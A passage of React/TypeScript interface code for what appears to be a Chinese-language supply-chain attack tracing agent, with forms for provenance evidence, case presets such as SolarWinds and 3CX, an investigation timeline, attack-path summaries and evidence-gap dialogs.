                    {agentBusy ? '正在调查' : agentRunStatusLabel(agentRun?.status)}
                  </Badge>
                  <Badge variant='outline' className='max-w-[220px] truncate rounded-md font-mono text-[10px]' title={form.targetPath}>
                    {targetLabel}
                  </Badge>
                </div>
                <p className='mt-1 line-clamp-2 text-sm text-muted-foreground'>
                  {agentRun?.narrative?.summary || '围绕污染入口、构建环节、产物可信、运行印证和攻击路径，自动组织一次供应链溯源调查。'}
                </p>
                <div className='mt-3 grid gap-2 sm:grid-cols-4'>
                  <AgentCommandMetric label='综合风险' value={commandSummary.riskScore} suffix='/100' tone='critical' />
                  <AgentCommandMetric label='攻击路径' value={commandSummary.attackPathCount} suffix='条' tone='active' />
                  <AgentCommandMetric label='证据缺口' value={commandSummary.evidenceGapCount} suffix='项' tone='warning' />
                  <AgentCommandMetric label='路径可信度' value={commandSummary.confidence} suffix='%' tone='success' />
                </div>
              </div>
            </div>
            <div className='flex flex-wrap justify-start gap-2 xl:justify-end'>
              <Button variant='outline' size='sm' onClick={() => jumpToPlatformTab('graph')} disabled={agentBusy}>
                <Network />
                攻击链地图
              </Button>
              <Button onClick={() => void startAgentRun()} disabled={agentBusy} size='sm' className={actionButtonClass}>
                {agentBusy ? <Loader2 className='animate-spin' /> : <Radar />}
                {agentBusy ? '正在调查' : '开始智能溯源'}
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      <div className='grid gap-4 2xl:grid-cols-[320px_minmax(0,1fr)_360px]'>
        <Card className='rounded-md 2xl:sticky 2xl:top-4 2xl:max-h-[calc(100svh-2rem)] 2xl:self-start 2xl:overflow-y-auto 2xl:overscroll-contain 2xl:[scrollbar-gutter:stable]'>
          <CardHeader className='pb-3'>
            <CardTitle className='flex items-center gap-2 text-base'>
              <ServerCog className='size-4 text-cyan-600' />
              溯源目标
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-3'>
            <Select value={targetPreset} onValueChange={(value) => selectTarget(value as AgentTargetPreset)}>
              <SelectTrigger aria-label='Agent 扫描目标'>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='3cx'>3CX / X_TRADER 案例</SelectItem>
                <SelectItem value='solarwinds'>SolarWinds / SUNBURST 案例</SelectItem>
                <SelectItem value='codecov'>Codecov Bash Uploader 案例</SelectItem>
                <SelectItem value='eventstream'>event-stream / flatmap-stream 案例</SelectItem>
                <SelectItem value='manual'>当前导入项目 / 手动路径</SelectItem>
              </SelectContent>
            </Select>
            <div className='space-y-2'>
              <Label htmlFor='agent-natural-language-task'>自然语言任务</Label>
              <Textarea
                id='agent-natural-language-task'
                value={form.question}
                onChange={(event) => setForm((current) => ({ ...current, question: event.target.value }))}
                placeholder='例如：结合这些材料判断是否存在外联风险，并给出处置优先级'
                className='min-h-20 resize-y text-sm'
              />
              <p className='text-[11px] text-muted-foreground'>Agent 会结合问题和附件类型自动选择代码、日志、产物或多模态模块。</p>
            </div>
            <div className='space-y-2'>
              <div className='flex items-center justify-between gap-2'>
                <Label>任务附件</Label>
                <input
                  ref={attachmentInputRef}
                  type='file'
                  multiple
                  accept='image/*,.log,.jsonl,.ndjson,.txt,.md,.json,.yaml,.yml,.csv,.zip,.tar,.gz,.tgz,.intoto.json,.intoto.jsonl'
                  className='hidden'
                  onChange={(event) => void addAttachments(Array.from(event.target.files ?? []))}
                />
                <Button
                  type='button'
                  variant='outline'
                  size='sm'
                  disabled={attachmentBusy}
                  onClick={() => attachmentInputRef.current?.click()}
                >
                  {attachmentBusy ? <Loader2 className='animate-spin' /> : <Upload />}
                  {attachmentBusy ? '上传中' : '选择文件'}
                </Button>
              </div>
              {attachments.length ? (
                <div className='space-y-1.5'>
                  {attachments.map((attachment) => (
                    <div key={attachment.attachmentId} className='flex items-center gap-2 rounded-md border bg-muted/20 px-2 py-1.5 text-xs'>
                      {attachment.kind === 'image' ? <Images className='size-3.5 text-cyan-600' /> : <FileText className='size-3.5 text-slate-500' />}
                      <span className='min-w-0 flex-1 truncate' title={attachment.filename}>{attachment.filename}</span>
                      <Badge variant='outline' className='rounded px-1.5 py-0 text-[10px]'>{attachmentKindLabel(attachment.kind)}</Badge>
                      <Button
                        type='button'
                        variant='ghost'
                        size='icon'
                        className='size-6 rounded-md'
                        aria-label={`移除附件 ${attachment.filename}`}
                        title='移除附件'
                        onClick={() => setAttachments((current) => current.filter((item) => item.attachmentId !== attachment.attachmentId))}
                      >
                        <X className='size-3.5' />
                      </Button>
                    </div>
                  ))}
                </div>
              ) : (
                <p className='rounded-md border border-dashed p-2 text-xs text-muted-foreground'>可上传截图、日志、JSON 或构建材料。</p>
              )}
            </div>
            <AgentTextField
              label='项目路径'
              value={form.targetPath}
              placeholder='项目目录，例如 cases/3cx-supply-chain/sample-repo'
              onChange={(value) => setForm((current) => ({ ...current, targetPath: value }))}
            />
            <Collapsible open={advancedOpen} onOpenChange={setAdvancedOpen}>
              <CollapsibleTrigger asChild>
                <Button variant='ghost' size='sm' className='w-full justify-between rounded-md border'>
                  证据材料配置
                  <ChevronDown className={cn('transition-transform', advancedOpen && 'rotate-180')} />
                </Button>
              </CollapsibleTrigger>
              <CollapsibleContent className='space-y-3 pt-3'>
                <AgentTextField label='Artifact 路径' value={form.artifactPath} placeholder='构建产物路径，可留空' onChange={(value) => setForm((current) => ({ ...current, artifactPath: value }))} />
                <AgentTextField label='Attestation 路径' value={form.attestationPath} placeholder='provenance / intoto 路径' onChange={(value) => setForm((current) => ({ ...current, attestationPath: value }))} />
                <AgentTextField label='预期仓库' value={form.expectedRepo} placeholder='可信仓库地址' onChange={(value) => setForm((current) => ({ ...current, expectedRepo: value }))} />
                <AgentTextField label='预期 Commit' value={form.expectedCommit} placeholder='可信 commit SHA' onChange={(value) => setForm((current) => ({ ...current, expectedCommit: value }))} />
                <AgentTextField label='允许 Workflow' value={form.allowedWorkflows} placeholder='换行或逗号分隔' onChange={(value) => setForm((current) => ({ ...current, allowedWorkflows: value }))} />
                <AgentTextField label='可信 Builder' value={form.allowedBuilders} placeholder='换行或逗号分隔' onChange={(value) => setForm((current) => ({ ...current, allowedBuilders: value }))} />
                <div className='space-y-2'>
                  <Label htmlFor='agent-log-paths'>日志路径</Label>
                  <Textarea
                    id='agent-log-paths'
                    value={form.logPaths}
                    onChange={(event) => setForm((current) => ({ ...current, logPaths: event.target.value }))}
                    placeholder='每行一份日志；不提供时 Agent 会给出补证建议'
                    className='min-h-20 resize-y font-mono text-xs'
                  />
                </div>
                <AgentSwitch label='要求签名验签' checked={form.requireSignature} onCheckedChange={(checked) => setForm((current) => ({ ...current, requireSignature: checked }))} />
                <AgentSwitch label='允许 self-hosted runner' checked={form.allowSelfHostedRunner} onCheckedChange={(checked) => setForm((current) => ({ ...current, allowSelfHostedRunner: checked }))} />
              </CollapsibleContent>
            </Collapsible>
          </CardContent>
        </Card>

        <Card className='overflow-hidden rounded-md'>
          <CardHeader className='border-b bg-muted/20'>
            <div className='flex flex-wrap items-center justify-between gap-3'>
              <div>
                <CardTitle className='flex items-center gap-2 text-base'>
                  <GitPullRequestArrow className='size-4 text-cyan-600' />
                  Agent 调查时间线
                </CardTitle>
              </div>
              {agentBusy ? (
                <Badge variant='outline' className='rounded-md border-cyan-200 bg-cyan-50 text-cyan-700'>
                  <Loader2 className='mr-1 size-3 animate-spin' />
                  同步调查中
                </Badge>
              ) : null}
            </div>
          </CardHeader>
          <CardContent className='p-4'>
            <AgentInvestigationTimeline stages={agentInvestigationStages} steps={steps} events={agentRun?.events ?? []} busy={agentBusy} />
          </CardContent>
        </Card>

        <Card className='rounded-md 2xl:sticky 2xl:top-4 2xl:max-h-[calc(100svh-2rem)] 2xl:self-start 2xl:overflow-y-auto 2xl:overscroll-contain 2xl:[scrollbar-gutter:stable]'>
          <CardHeader className='pb-3'>
            <CardTitle className='flex items-center gap-2 text-base'>
              <ShieldCheck className='size-4 text-emerald-600' />
              当前结论
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-4'>
            {agentRun?.narrative ? <AgentNarrativeSummary narrative={agentRun.narrative} /> : null}
            <AgentPathBriefing paths={topPaths} onFocusPath={(pathId) => focusAttackPath(pathId)} />
            <Separator />
            <div className='space-y-2'>
              <div className='flex items-center justify-between'>
                <h3 className='text-sm font-semibold'>证据缺口</h3>
                <Badge variant='outline' className='rounded-md'>{gaps.length} 项</Badge>
              </div>
              {gaps.length ? gaps.slice(0, 4).map((gap) => (
                <AgentEvidenceGapCard key={gap.id} gap={gap} onOpen={() => setSelectedGap(gap)} />
              )) : (
                <div className='rounded-md border border-dashed bg-muted/20 p-3 text-sm text-muted-foreground'>
                  {agentRun ? '本次 Agent 执行未发现输入材料缺口。' : '执行 Agent 后会自动列出补证建议。'}
                </div>
              )}
            </div>
            <Separator />
            <div className='space-y-2'>
              <div className='flex items-center justify-between'>
                <h3 className='text-sm font-semibold'>下一步动作</h3>
                <Badge variant='outline' className='rounded-md'>{actions.length} 项</Badge>
              </div>
              {actions.length ? actions.slice(0, 4).map((action, index) => (
                <AgentNextActionItem
                  key={`${action.title}-${index}`}
                  action={action}
                  index={index}
                  onRun={() => void handleAgentAction(action)}
                />
              )) : (
                <div className='rounded-md border border-dashed bg-muted/20 p-3 text-sm text-muted-foreground'>
                  完成智能溯源后会生成处置优先级。
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>

      <AgentEvidenceGapDrawer gap={selectedGap} onOpenChange={(open) => !open && setSelectedGap(null)} />
    </div>
  )

  return (
    <Card className='overflow-hidden rounded-md'>
      <CardHeader className='border-b bg-muted/20'>
        <div className='flex flex-wrap items-start justify-between gap-4'>
          <div className='flex min-w-0 items-start gap-3'>
            <div className='grid size-10 shrink-0 place-items-center rounded-md border bg-background shadow-sm'>
              <Bot className='size-5 text-cyan-600' />
            </div>
            <div className='min-w-0'>
              <CardTitle className='flex flex-wrap items-center gap-2 text-base'>
                智能溯源 Agent
                <Badge variant='outline' className={cn('rounded-md', agentRunStatusClass(agentRun?.status, agentBusy))}>
                  {agentBusy ? '执行中' : agentRunStatusLabel(agentRun?.status)}
                </Badge>
              </CardTitle>
            </div>
          </div>
          <div className='flex flex-wrap gap-2'>
            <Button variant='outline' size='sm' onClick={() => jumpToPlatformTab('graph')} disabled={agentBusy}>
              <Network />
              查看攻击链地图
            </Button>
            <Button onClick={() => void startAgentRun()} disabled={agentBusy} size='sm'>
              {agentBusy ? <Loader2 className='animate-spin' /> : <Radar />}
              {agentBusy ? '正在智能溯源' : '开始智能溯源'}
            </Button>
          </div>
        </div>
      </CardHeader>

      <CardContent className='space-y-5 p-4 sm:p-5'>
        <section className='grid gap-4 xl:grid-cols-[minmax(0,1.25fr)_minmax(320px,0.75fr)]'>
          <div className='space-y-3 rounded-md border bg-background p-4'>
            <div className='flex items-center justify-between gap-3'>
              <div>
                <h3 className='text-sm font-semibold'>扫描目标</h3>
              </div>
              <Badge variant='outline' className='rounded-md'>
                同步编排
              </Badge>
            </div>
            <div className='grid gap-3 lg:grid-cols-[220px_minmax(0,1fr)]'>
              <Select value={targetPreset} onValueChange={(value) => selectTarget(value as AgentTargetPreset)}>
                <SelectTrigger aria-label='Agent 扫描目标'>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value='3cx'>3CX / X_TRADER 案例</SelectItem>
                  <SelectItem value='solarwinds'>SolarWinds / SUNBURST 案例</SelectItem>
                  <SelectItem value='codecov'>Codecov Bash Uploader 案例</SelectItem>
                  <SelectItem value='eventstream'>event-stream / flatmap-stream 案例</SelectItem>
                  <SelectItem value='manual'>当前导入项目 / 手动路径</SelectItem>
                </SelectContent>
              </Select>
              <Input
                value={form.targetPath}
                onChange={(event) => setForm((current) => ({ ...current, targetPath: event.target.value }))}
                placeholder='项目目录，例如 cases/3cx-supply-chain/sample-repo'
                className='font-mono text-xs'
                title={form.targetPath}
              />
            </div>

            <Collapsible open={advancedOpen} onOpenChange={setAdvancedOpen}>
              <CollapsibleTrigger asChild>
                <Button variant='ghost' size='sm' className='w-full justify-between rounded-md border'>
                  高级证据配置
                  <ChevronDown className={cn('transition-transform', advancedOpen && 'rotate-180')} />
                </Button>
              </CollapsibleTrigger>
              <CollapsibleContent className='pt-3'>
                <div className='grid gap-3 md:grid-cols-2'>
                  <AgentTextField
                    label='Artifact 路径'
                    value={form.artifactPath}
                    placeholder='构建产物路径，可留空'
                    onChange={(value) => setForm((current) => ({ ...current, artifactPath: value }))}
                  />
                  <AgentTextField
                    label='Attestation / Provenance 路径'
                    value={form.attestationPath}
                    placeholder='JSON / JSONL 路径，可留空'
                    onChange={(value) => setForm((current) => ({ ...current, attestationPath: value }))}
                  />
                  <AgentTextField
                    label='预期来源仓库'
                    value={form.expectedRepo}
                    placeholder='可信仓库地址'
                    onChange={(value) => setForm((current) => ({ ...current, expectedRepo: value }))}
                  />
                  <AgentTextField
                    label='预期 Commit'
                    value={form.expectedCommit}
                    placeholder='可信 commit SHA'
                    onChange={(value) => setForm((current) => ({ ...current, expectedCommit: value }))}
                  />
                  <AgentTextField
                    label='允许的 Workflow'
                    value={form.allowedWorkflows}
                    placeholder='多个值使用换行或逗号分隔'
                    onChange={(value) => setForm((current) => ({ ...current, allowedWorkflows: value }))}
                  />
                  <AgentTextField
                    label='可信 Builder'
                    value={form.allowedBuilders}
                    placeholder='多个值使用换行或逗号分隔'
                    onChange={(value) => setForm((current) => ({ ...current, allowedBuilders: value }))}
                  />
                  <div className='space-y-2 md:col-span-2'>
                    <Label htmlFor='agent-log-paths'>运行日志路径</Label>
                    <Textarea
                      id='agent-log-paths'
                      value={form.logPaths}
                      onChange={(event) => setForm((current) => ({ ...current, logPaths: event.target.value }))}
                      placeholder='每行一份日志；不提供时 Agent 会给出补证建议'
                      className='min-h-20 resize-y font-mono text-xs'
                    />
                  </div>
                  <div className='flex flex-wrap gap-3 md:col-span-2'>
                    <AgentSwitch
                      label='要求签名验签'
                      checked={form.requireSignature}
                      onCheckedChange={(checked) => setForm((current) => ({ ...current, requireSignature: checked }))}
                    />
                    <AgentSwitch
                      label='允许 self-hosted runner'
                      checked={form.allowSelfHostedRunner}
                      onCheckedChange={(checked) => setForm((current) => ({ ...current, allowSelfHostedRunner: checked }))}
                    />
                  </div>
                </div>
              </CollapsibleContent>
            </Collapsible>
          </div>

          <div className='rounded-md border bg-muted/20 p-4'>
            <div className='flex items-center justify-between gap-3'>
              <div>
                <h3 className='text-sm font-semibold'>本次研判摘要</h3>
              </div>
              {agentRun?.runId ? (
                <Badge variant='outline' className='max-w-[160px] truncate rounded-md font-mono text-[10px]' title={agentRun?.runId ?? undefined}>
                  {agentRun?.runId}
                </Badge>
              ) : null}
            </div>
            <div className='mt-4 grid grid-cols-2 gap-2'>
              <AgentMetric label='风险评分' value={agentRun?.summary.riskScore ?? workspace.summary.risk_score} tone='critical' />
              <AgentMetric label='攻击路径' value={agentRun?.workspace?.summary.attack_paths ?? workspace.summary.attack_paths} tone='active' />
              <AgentMetric label='成功步骤' value={agentRun?.summary.success ?? 0} tone='success' />
              <AgentMetric label='证据缺口' value={agentRun?.summary.evidenceGapCount ?? 0} tone='warning' />
            </div>
          </div>
        </section>

        <section className='space-y-3'>
          <div className='flex flex-wrap items-center justify-between gap-3'>
            <div>
              <h3 className='text-sm font-semibold'>执行步骤</h3>
              <p className='mt-1 text-xs text-muted-foreground'>Agent 自动执行的供应链检测与溯源流程</p>
            </div>
            {agentBusy ? (
              <div className='flex items-center gap-2 text-xs text-cyan-700'>
                <Loader2 className='size-3.5 animate-spin' />
                正在执行，请等待完整结果
              </div>
            ) : null}
          </div>
          <div className='grid gap-2 md:grid-cols-2 xl:grid-cols-3'>
            {steps.map((step, index) => (
              <AgentStepItem key={step.id} step={step} index={index} busy={agentBusy} />
            ))}
          </div>
        </section>

        <section id='agent-evidence-gaps' className='grid gap-4 xl:grid-cols-2'>
          <div className='space-y-3 rounded-md border p-4'>
            <div className='flex items-center justify-between gap-3'>
              <div>
                <h3 className='flex items-center gap-2 text-sm font-semibold'>
                  <FileSearch className='size-4 text-orange-600' />
                  证据缺口
                </h3>
                <p className='mt-1 text-xs text-muted-foreground'>缺少什么材料、去哪里找、能证明什么</p>
              </div>
              <Badge variant='outline' className='rounded-md'>{gaps.length} 项</Badge>
            </div>
            {gaps.length ? (
              <div className='space-y-2'>
                {gaps.slice(0, 4).map((gap) => <AgentEvidenceGapItem key={gap.id} gap={gap} />)}
              </div>
            ) : (
              <div className='rounded-md border border-dashed bg-muted/20 p-3 text-sm text-muted-foreground'>
                {agentRun ? '本次 Agent 执行未发现输入材料缺口。' : '执行 Agent 后会自动列出需要补充的证据。'}
              </div>
            )}
          </div>

          <div className='space-y-3 rounded-md border p-4'>
            <div className='flex items-center justify-between gap-3'>
              <div>
                <h3 className='flex items-center gap-2 text-sm font-semibold'>
                  <ClipboardList className='size-4 text-emerald-600' />
                  下一步动作
                </h3>
                <p className='mt-1 text-xs text-muted-foreground'>根据扫描结果自动排序的处置建议</p>
              </div>
              <Badge variant='outline' className='rounded-md'>{actions.length} 项</Badge>
            </div>
            {actions.length ? (
              <div className='space-y-2'>
                {actions.slice(0, 5).map((action, index) => (
                  <AgentNextActionItem key={`${action.title}-${index}`} action={action} index={index} />
                ))}
              </div>
            ) : (
              <div className='rounded-md border border-dashed bg-muted/20 p-3 text-sm text-muted-foreground'>
                完成智能溯源后会生成处置优先级和下一步动作。
              </div>
            )}
          </div>
        </section>
      </CardContent>
    </Card>
  )
}

function AgentCommandMetric({
  label,
  value,
  suffix,
  tone,
}: {
  label: string
  value: number
  suffix: string
  tone: 'critical' | 'active' | 'success' | 'warning'
}) {
  const toneClass = {
    critical: 'text-red-600',
    active: 'text-cyan-600',
    success: 'text-emerald-600',
    warning: 'text-orange-600',
  }[tone]
  return (
    <div className='min-w-0 rounded-md border bg-background/85 px-3 py-2'>
      <div className='truncate text-[11px] text-muted-foreground'>{label}</div>
      <div className={cn('mt-0.5 flex items-baseline gap-1 text-lg font-semibold', toneClass)}>
        {value}
        <span className='text-[10px] font-normal text-muted-foreground'>{suffix}</span>
      </div>
    </div>
  )
}

function AgentInvestigationTimeline({
  stages,
  steps,
  events,
  busy,
}: {
  stages: AgentInvestigationStage[]
  steps: AgentRunStep[]
  events: AgentRunEvent[]
  busy: boolean
}) {
  return (
    <div className='relative space-y-0'>
      <div className='absolute bottom-8 left-[19px] top-8 w-px bg-border' />
      {stages.map((stage, index) => {
        const relatedSteps = steps.filter((step) => stage.stepIds.includes(step.id))
        const status = agentInvestigationStatus(relatedSteps, busy, index)
        const relatedEvents = events.filter((event) => stage.stepIds.includes(event.stepId))
        const latestEvent = relatedEvents[relatedEvents.length - 1]
        const summary = latestEvent?.message || relatedSteps.map((step) => step.error || agentStepSummaryText(step.summary)).filter(Boolean).join('；')
        return (
          <button
            key={stage.id}
            type='button'
            className='relative grid w-full min-w-0 grid-cols-[40px_minmax(0,1fr)] gap-3 rounded-md px-1 py-3 text-left transition-colors hover:bg-muted/40'
            onClick={() => jumpToPlatformTab(stage.moduleTab)}
          >
            <div className={cn(
              'relative z-10 grid size-10 place-items-center rounded-md border bg-background',
              status === 'success' && 'border-emerald-200 text-emerald-600',
              status === 'running' && 'border-cyan-300 bg-cyan-50 text-cyan-700 shadow-[0_0_0_4px_rgba(6,182,212,0.08)]',
              status === 'failed' && 'border-red-200 text-red-600',
              status === 'skipped' && 'text-muted-foreground'
            )}>
              {status === 'running' ? <Loader2 className='size-4 animate-spin' /> : stage.icon}
            </div>
            <div className='min-w-0 rounded-md border bg-background p-3'>
              <div className='flex flex-wrap items-start justify-between gap-2'>
                <div className='min-w-0'>
                  <div className='flex items-center gap-2'>
                    <span className='text-xs text-muted-foreground'>阶段 {index + 1}</span>
                    <Badge variant='outline' className={cn('rounded-md text-[10px]', agentStepStatusClass(status))}>
                      {agentStepStatusLabel(status)}
                    </Badge>
                  </div>
                  <h3 className='mt-1 text-sm font-semibold'>{stage.title}</h3>
                </div>
                <Badge variant='outline' className='max-w-[190px] truncate rounded-md font-mono text-[10px]' title={stage.evidenceLabel}>
                  {stage.evidenceLabel}
                </Badge>
              </div>
              <p className='mt-1 text-xs leading-5 text-muted-foreground'>{stage.subtitle}</p>
              <div className='mt-2 grid gap-2 sm:grid-cols-2'>
                <div className='rounded-md bg-muted/35 px-2.5 py-2 text-xs'>
                  <span className='text-muted-foreground'>调查目标：</span>
                  {stage.successCriteria}
                </div>
                <div className='min-w-0 rounded-md bg-muted/35 px-2.5 py-2 text-xs'>
                  <span className='text-muted-foreground'>当前发现：</span>
                  <span className='line-clamp-2'>{summary || (busy ? '正在调用检测模块并关联证据' : '等待 Agent 执行')}</span>
                </div>
              </div>
              {relatedEvents.length ? (
                <div className='mt-2 flex flex-wrap gap-1.5'>
                  {relatedEvents.slice(-3).map((event) => (
                    <Badge key={event.id} variant='outline' className={cn(
                      'max-w-full truncate rounded-md text-[10px]',
                      event.level === 'error' && severityClasses.critical,
                      event.level === 'warning' && severityClasses.medium,
                      event.level !== 'error' && event.level !== 'warning' && statusClasses.observed
                    )} title={event.message}>
                      {event.message}
                    </Badge>
                  ))}
                </div>
              ) : null}
            </div>
          </button>
        )
      })}
    </div>
  )
}

function AgentNarrativeSummary({ narrative }: { narrative: NonNullable<AgentRunResult['narrative']> }) {
  return (
    <div className='space-y-2 rounded-md border bg-muted/20 p-3'>
      <div className='flex items-start justify-between gap-3'>
        <div className='min-w-0'>
          <div className='text-xs text-muted-foreground'>Agent 判断</div>
          <div className='mt-1 line-clamp-2 text-sm font-semibold'>{narrative.verdict}</div>
        </div>
        <Badge variant='outline' className='shrink-0 rounded-md border-cyan-200 bg-cyan-50 text-cyan-700'>
          {narrative.confidence}% 可信
        </Badge>
      </div>
      <p className='line-clamp-3 text-xs leading-5 text-muted-foreground'>{narrative.summary}</p>
      {narrative.keyEvidence?.length ? (
        <div className='flex flex-wrap gap-1.5'>
          {narrative.keyEvidence.slice(0, 3).map((item) => (
            <Badge key={item} variant='outline' className='max-w-full truncate rounded-md text-[10px]' title={item}>
              {item}
            </Badge>
          ))}
        </div>
      ) : null}
    </div>
  )
}

function AgentPathBriefing({
  paths,
  onFocusPath,
}: {
  paths: KnowledgeGraphAttackPath[]
  onFocusPath: (pathId: string) => void
}) {
  return (
    <div className='space-y-2'>
      <div className='flex items-center justify-between'>
        <h3 className='text-sm font-semibold'>候选攻击路径</h3>
        <Badge variant='outline' className='rounded-md'>{paths.length} 条</Badge>
      </div>
      {paths.length ? paths.map((path, index) => (
        <button
          key={path.id}
          type='button'
          onClick={() => onFocusPath(path.id)}
          className='w-full rounded-md border bg-background p-3 text-left transition-colors hover:border-cyan-300 hover:bg-cyan-50/30'
        >
          <div className='flex items-start justify-between gap-3'>
            <div className='min-w-0'>
              <div className='text-[10px] text-muted-foreground'>路径 {index + 1}</div>
              <div className='mt-0.5 break-words text-sm font-medium leading-5 [overflow-wrap:anywhere]'>
                {path.title || path.description || '供应链攻击路径'}
              </div>
            </div>
            <Badge variant='outline' className={cn('shrink-0 rounded-md', pathVerdictClass(path.verdict))}>
              {Math.round((path.confidence ?? 0) * 100)}%
            </Badge>
          </div>
          <div className='mt-2 flex flex-wrap gap-1.5 text-[10px] text-muted-foreground'>
            <span>{path.path_steps?.length || path.node_ids?.length || 0} 环节</span>
            <span>·</span>
            <span>{path.evidence_ids?.length || 0} 证据</span>
            <span>·</span>
            <span>{path.gaps?.length || 0} 缺口</span>
          </div>
        </button>
      )) : (
        <div className='rounded-md border border-dashed bg-muted/20 p-3 text-sm text-muted-foreground'>
          完成 Agent 调查后会显示可信度最高的候选路径。
        </div>
      )}
    </div>
  )
}

function AgentEvidenceGapCard({ gap, onOpen }: { gap: AgentEvidenceGap; onOpen: () => void }) {
  return (
    <button
      type='button'
      onClick={onOpen}
      className='flex w-full items-start gap-3 rounded-md border bg-background p-3 text-left transition-colors hover:border-orange-300 hover:bg-orange-50/30'
    >
      <FileSearch className='mt-0.5 size-4 shrink-0 text-orange-600' />
      <div className='min-w-0 flex-1'>
        <div className='flex items-center justify-between gap-2'>
          <span className='truncate text-sm font-medium'>{gap.module}</span>
          <Badge variant='outline' className={cn('shrink-0 rounded-md', severityClasses[gap.severity])}>
            {severityLabel(gap.severity)}
          </Badge>
        </div>
        <p className='mt-1 line-clamp-2 text-xs leading-5 text-muted-foreground'>{gap.reason}</p>
      </div>
    </button>
  )
}

function AgentEvidenceGapDrawer({
  gap,
  onOpenChange,
}: {
  gap: AgentEvidenceGap | null
  onOpenChange: (open: boolean) => void
}) {
  const keywords = gap?.keywords?.filter(Boolean) ?? []
  return (
    <Dialog open={Boolean(gap)} onOpenChange={onOpenChange}>
      <DialogContent className='sm:max-w-2xl'>
        <DialogHeader>
          <DialogTitle className='flex items-center gap-2'>
            <FileSearch className='size-5 text-orange-600' />
            补充证据指引
          </DialogTitle>
          <DialogDescription>{gap?.module || '证据缺口'}</DialogDescription>
        </DialogHeader>
        {gap ? (
          <div className='space-y-4'>
            <div className='rounded-md border bg-muted/25 p-3 text-sm leading-6'>
              <div className='font-medium'>{gap.question || 'Agent 需要你补充一类证据。'}</div>
              <div className='mt-1 text-muted-foreground'>{gap.reason}</div>
            </div>
            {gap.missingItems?.length ? (
              <div className='space-y-2'>
                <Label>缺少材料</Label>
                <div className='flex flex-wrap gap-2'>
                  {gap.missingItems.map((item) => (
                    <Badge key={item} variant='outline' className='max-w-full truncate rounded-md' title={item}>
                      {item}
                    </Badge>
                  ))}
                </div>
              </div>
            ) : null}
            <div className='grid gap-3 sm:grid-cols-2'>
              <AgentGapDetail label='去哪里找' value={gap.whereToFind?.join('、') || '-'} />
              <AgentGapDetail label='上传到哪个模块' value={gap.uploadTo || '-'} />
              <AgentGapDetail label='能证明什么' value={gap.proves || '-'} className='sm:col-span-2' />
            </div>
            {gap.examplePaths?.length ? (
              <div className='space-y-2'>
                <Label>样例文件</Label>
                <div className='grid gap-2'>
                  {gap.examplePaths.map((item) => (
                    <code key={item} className='truncate rounded-md border bg-muted/30 px-2.5 py-2 text-xs' title={item}>
                      {item}
                    </code>
                  ))}
                </div>
              </div>
            ) : null}
            <div className='space-y-2'>
              <div className='flex items-center justify-between gap-3'>
                <Label>推荐检索关键词</Label>
                <Button
                  variant='outline'
                  size='sm'
                  disabled={!keywords.length}
                  onClick={() => void copyAgentText(keywords.join(' '), '检索关键词已复制')}
                >
                  <Copy className='size-3.5' />
                  复制关键词
                </Button>
              </div>
              <div className='flex min-h-12 flex-wrap gap-2 rounded-md border bg-muted/20 p-3'>
                {keywords.length ? keywords.map((keyword) => (
                  <Badge key={keyword} variant='outline' className='max-w-full truncate rounded-md font-mono' title={keyword}>
                    {keyword}
                  </Badge>
                )) : <span className='text-sm text-muted-foreground'>暂无可用关键词</span>}
              </div>
            </div>
            {gap.actionButtons?.length ? (
              <div className='flex flex-wrap gap-2'>
                {gap.actionButtons.map((button) => (
                  <Button
                    key={`${button.label}-${button.actionKind}`}
                    variant='outline'
                    size='sm'
                    onClick={() => {
                      if (button.actionKind === 'copy_keywords') {
                        void copyAgentText(keywords.join(' '), '检索关键词已复制')
                        return
                      }
                      if (button.targetModule) jumpToModuleName(button.targetModule)
                    }}
                  >
                    {button.label}
                  </Button>
                ))}
              </div>
            ) : null}
          </div>
        ) : null}
      </DialogContent>
    </Dialog>
  )
}

function AgentGapDetail({ label, value, className }: { label: string; value: string; className?: string }) {
  return (
    <div className={cn('rounded-md border p-3', className)}>
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className='mt-1 break-words text-sm leading-6'>{value}</div>
    </div>
  )
}

function AgentTextField({
  label,
  value,
  placeholder,
  onChange,
}: {
  label: string
  value: string
  placeholder: string
  onChange: (value: string) => void
}) {
  return (
    <div className='min-w-0 space-y-2'>
      <Label>{label}</Label>
      <Input
        value={value}
        onChange={(event) => onChange(event.target.value)}
        placeholder={placeholder}
        className='font-mono text-xs'
        title={value}
      />
    </div>
  )
}

function AgentSwitch({
  label,
  checked,
  onCheckedChange,
}: {
  label: string
  checked: boolean
  onCheckedChange: (checked: boolean) => void
}) {
  return (
    <div className='flex items-center gap-3 rounded-md border bg-background px-3 py-2'>
      <Switch checked={checked} onCheckedChange={onCheckedChange} aria-label={label} />
      <span className='text-sm'>{label}</span>
    </div>
  )
}

function AgentMetric({
  label,
  value,
  tone,
}: {
  label: string
  value: number
  tone: 'critical' | 'active' | 'success' | 'warning'
}) {
  const toneClass = {
    critical: 'text-red-600',
    active: 'text-cyan-600',
    success: 'text-emerald-600',
    warning: 'text-orange-600',
  }[tone]
  return (
    <div className='rounded-md border bg-background p-3'>
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className={cn('mt-1 text-xl font-semibold', toneClass)}>{value}</div>
    </div>
  )
}

function AgentStepItem({ step, index, busy }: { step: AgentRunStep; index: number; busy: boolean }) {
  const status = busy && step.status === 'pending' ? 'running' : step.status
  const summary = agentStepSummaryText(step.summary)
  return (
    <div className='min-w-0 rounded-md border bg-background p-3'>
      <div className='flex items-start justify-between gap-3'>
        <div className='flex min-w-0 gap-2.5'>
          <div className='grid size-7 shrink-0 place-items-center rounded-md bg-muted text-xs font-semibold'>
            {index + 1}
          </div>
          <div className='min-w-0'>
            <div className='truncate text-sm font-semibold' title={step.name}>{step.name}</div>
            <div className='mt-1 line-clamp-2 text-xs leading-5 text-muted-foreground'>{step.description}</div>
          </div>
        </div>
        <Badge variant='outline' className={cn('shrink-0 rounded-md', agentStepStatusClass(status))}>
          {agentStepStatusLabel(status)}
        </Badge>
      </div>
      <div className='mt-3 truncate border-t pt-2 text-xs text-muted-foreground' title={step.error || summary}>
        {step.error || summary || '等待 Agent 执行'}
      </div>
    </div>
  )
}

